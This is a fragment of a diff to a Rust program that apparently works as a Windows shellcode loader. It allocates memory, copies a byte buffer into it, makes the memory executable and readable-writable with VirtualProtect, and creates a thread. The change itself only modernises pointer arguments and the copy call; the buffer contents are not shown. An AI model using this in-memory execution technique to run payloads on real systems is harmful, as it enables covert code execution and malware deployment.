@@ -1,6 +1,6 @@
 use std::{
     ffi::c_void,
-    ptr::{copy, null, null_mut},
+    ptr::copy_nonoverlapping,
 };
 use windows::Win32::System::Memory::{
     VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
@@ -36,22 +36,22 @@ fn main() {
     ];
     unsafe {
         let hthread = CreateThread(
-            Some(null()),
+            None,
             0,
             Some(function),
-            Some(null()),
+            None,
             THREAD_CREATION_FLAGS(0),
-            Some(null_mut()),
+            None,
         ).unwrap_or_else(|e| panic!("[!] CreateThread Failed With Error: {e}"));
 
         let address = VirtualAlloc(
-            Some(null()),
+            None,
             buf.len(),
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
 
-        copy(buf.as_ptr() as _, address, buf.len());
+        copy_nonoverlapping(buf.as_ptr() as _, address, buf.len());
 
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
         VirtualProtect(address, buf.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect).unwrap_or_else(|e| {
